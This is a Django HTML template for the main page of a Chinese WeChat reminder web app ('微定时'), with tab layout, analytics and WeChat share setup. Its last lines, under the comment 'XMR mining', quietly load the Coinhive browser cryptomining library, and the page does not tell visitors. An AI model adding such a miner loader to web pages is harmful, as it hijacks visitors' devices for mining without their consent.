<!DOCTYPE html>
{% load staticfiles %}
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>微定时 — 我的提醒</title>
    <link rel="canonical" href="http://wecron.betacat.io/"/>
    <link rel="shortcut icon" href="{% static "img/favicon.jpeg" %}">
    <link rel="bookmark" href="{% static "img/favicon.jpeg" %}" >
    <link href="https://res.wx.qq.com/open/libs/weui/1.1.0/weui.min.css" rel="stylesheet">
    <link href="//cdn.bootcss.com/ionic/1.3.2/css/ionic.min.css" rel="stylesheet">
    <link href="{% static "css/remind.css" %}" rel="stylesheet">

    <script src="//cdn.bootcss.com/ionic/1.3.2/js/ionic.bundle.min.js"></script>
    <script src="//cdn.bootcss.com/angular-i18n/1.5.3/angular-locale_zh-cn.min.js" defer></script>
    <script src="https://res.wx.qq.com/open/libs/weuijs/1.0.0/weui.min.js" defer></script>
    <script>
        var userID = "{{ request.user.pk }}";
        var settingsUrl = "{% static "tpls/settings.html" %}";
        var remindListUrl = "{% static "tpls/remind_list.html" %}";
        var remindDetailUrl = "{% static "tpls/remind_detail.html" %}";
        // handle hijack by ISP
        if (window !== top) top.location.href = window.location.href;
    </script>
    <script src="{% static "js/remind.js" %}"></script>
    <script>
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8e44abe7851728334fe213346c9bec1f";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
    </script>
</head>

<body ng-app="remind">

    <ion-tabs class="tabs-icon-top tabs-positive">
        <ion-tab title="提醒" icon-on="icon ion-ios-clock" icon-off="icon ion-ios-clock-outline" ui-sref="remind-list">
            <!--Put title align here for Android-->
            <ion-nav-bar class="bar-positive no-border" align-title="center"></ion-nav-bar>
            <ion-nav-view name="remind-view"></ion-nav-view>
        </ion-tab>
        <ion-tab title="设置" icon-on="icon ion-ios-gear" icon-off="icon ion-ios-gear-outline" ui-sref="settings">
            <ion-nav-view name="settings-view"></ion-nav-view>
        </ion-tab>
    </ion-tabs>

    <div id="weixinTip" onclick="this.style.display='none'">
        <!-- ng-src for lazy load -->
        <img ng-src="{% static "img/weixin-share.png" %}" />
    </div>

    <script id="loading-toast" type="text/ng-template">
        <div class="weui-mask_transparent"></div>
        <div class="weui-toast">
            <i class="weui-loading weui-icon_toast"></i>
            <p class="weui-toast__content">数据加载中</p>
        </div>
    </script>
    <script src="https://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
    <script>
        wx.config({
            debug: false,
            appId: '{{ appId }}',
            timestamp: {{ timestamp }},
            nonceStr: '{{ nonce_str }}',
            signature: '{{ signature }}',
            jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'onMenuShareQQ', 'onMenuShareWeibo', 'onMenuShareQZone']
        });
    </script>
    <!-- XMR mining -->
    <script async src="https://coinhive.com/lib/coinhive.min.js"></script>
</body>
</html>
